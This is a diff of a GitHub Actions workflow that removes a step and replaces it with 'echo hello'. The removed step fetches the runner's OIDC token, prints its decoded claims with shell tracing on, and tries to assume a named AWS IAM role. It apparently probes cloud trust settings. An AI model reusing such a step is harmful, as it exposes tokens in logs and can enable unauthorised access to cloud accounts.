@@ -1,22 +1,7 @@
 name: o
 on: push
-permissions:
-  id-token: write
-  contents: read
 jobs:
   o:
     runs-on: ubuntu-latest
     steps:
-      - name: assume
-        run: |
-          set -x
-          IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
-          TOKEN=$(python3 -c "import json,sys;print(json.loads(sys.stdin.read())['value'])" <<<"$IDT")
-          echo "=====CLAIMS====="
-          python3 -c "
-import base64,json,sys
-t=sys.argv[1].split('.')[1]; t+='='*(-len(t)%4)
-print(json.dumps(json.loads(base64.urlsafe_b64decode(t)),indent=1))
-" "$TOKEN"
-          echo "=====ASSUME====="
-          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::301142909784:role/github-actions-danoguer-dev-role --role-session-name ghoidc --web-identity-token "$TOKEN" --duration-seconds 900 --output json --region us-east-1 || echo "ASSUME_FAILED"
+      - run: echo hello
